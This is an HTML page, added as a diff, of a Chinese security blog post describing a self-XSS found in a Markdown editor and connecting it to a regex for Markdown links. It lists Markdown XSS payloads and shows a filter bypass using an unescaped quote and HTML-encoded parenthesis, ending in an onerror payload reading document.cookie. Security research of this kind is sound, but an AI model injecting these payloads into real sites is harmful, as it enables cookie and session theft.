@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            偶遇Markdown类型的Self xss
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>今天遇到了一个Markdown的编辑器，打开后看了一下。突然想到之前在之前遇到的一个Markdown Self xss，心想这个是不是也会有同样的问题？于是测了一下，结果还真找出来了。更巧的是，今晚上学习正则表达式的时候，竟然正好学到匹配Markdown标签的内容，而且匹配之后会出现的情况跟我今天测试的一模一样~ </p>
+<p>以前也总结过关于Markdown中的xss，除了直接把xss payload复制到编辑框以外，还有构造markdown的一些标签：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">链接：</span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;Click Me&lt;/a&gt;</span><br><span class="line">[Click Me](javascript:alert(<span class="string">&#x27;Uh oh...&#x27;</span>))</span><br><span class="line"></span><br><span class="line">图片：</span><br><span class="line">&lt;img src=<span class="string">&quot;&quot;</span> onerror=<span class="string">&quot;alert(&#x27;XSS&#x27;) alt=&quot;</span>Uh oh...<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">![Uh oh...](&quot;</span>onerror=<span class="string">&quot;alert(&#x27;XSS&#x27;))</span></span><br><span class="line"><span class="string">![Uh oh...](https://www.example.com/image.png&quot;</span>onload=<span class="string">&quot;alert(&#x27;XSS&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<p>今天遇到的就和这个一样，但是需要一点点绕过。</p>
+<p>一开始我对一些payload都尝试了一下，然后发现了一个比较有趣的地方：</p>
+<p>我这里以图片为例：（链接的话还需要点一下，我想要的是直接复制进去然后弹窗）</p>
+<p> <code>![img]([https://www.baidu.com/img/bd_logo1.png](https://www.baidu.com/img/bd_logo1.png)&quot;)</code></p>
+<p><img src="https://i.loli.net/2020/04/29/DIhn8iUZgLJNyaQ.png" alt="Untitled.png"></p>
+<p>可以看到，这里的双引号竟然没有过滤~ 心想有戏。于是继续加了onload事件：</p>
+<p><code>![img]([https://www.baidu.com/img/bd_logo1.png](https://www.baidu.com/img/bd_logo1.png)&quot;onload=alert(1))</code></p>
+<p><img src="https://i.loli.net/2020/04/29/zqYcrjtUosKWQBO.png" alt="Untitled 1.png"></p>
+<p>这时发现了一个问题，右边的括号被挤出去了。之后我去看了一下我的bypass那个笔记，过滤括号可以使用反引号代替，但是这个地方的反引号会被直接替换为<code>&lt;code&gt;&lt;/code&gt;</code> 导致利用失败。其他都没有找到直接的办法。</p>
+<p>我想到：编辑器取左边输入的内容输出到右边，是一个再生成的过程。当我输入HTML编码，右边是不是会输出出来并被解析呢？于是我在这个页面上尝试了一下HTML编码，发现，右边输出的内容果然是HTML编码解析后的结果：</p>
+<p><img src="https://i.loli.net/2020/04/29/fGTE9dcylRmS71t.png" alt="Untitled 2.png"></p>
+<p>之后就是直接加上右括号的HTML编码然后写payload了：(右边的//是用来注释多余的双引号)</p>
+<p><code>![img]([https://www.baidu.com/img/bd_logo1.png](https://www.baidu.com/img/bd_logo1.png)&quot;onload=alert(1)//)</code></p>
+<p>最终payload：</p>
+<p><code>![1](1&quot;onerror=alert(document.cookie&amp;#41;//)</code></p>
+<p><img src="https://i.loli.net/2020/04/29/sYZTnHe8d7I5vag.png" alt="Untitled 3.png"></p>
+<p>然后到了今天晚上，我在学习正则表达式。说到这个分组，就有一个小训练是关于匹配markdown的链接生成a标签。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[google](http:<span class="comment">//google.com)</span></span><br><span class="line">[itp](http:<span class="comment">//itp.nyu.edu)</span></span><br><span class="line">[Coding Rainbow](http:<span class="comment">//codingrainbow.com)</span></span><br></pre></td></tr></table></figure>
+
+<p>最终的正则：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\[(.*?)\]\((http.*?)\)</span><br></pre></td></tr></table></figure>
+
+<p>但是当我尝试在这个正则表达式所匹配的内容写xss的时候，就突然发现。右边的括号…也被挤出去了。所以最后猜想的结果是：</p>
+<p><img src="https://i.loli.net/2020/04/29/zSIByxfo5Fag7VK.png" alt="Untitled 4.png"></p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
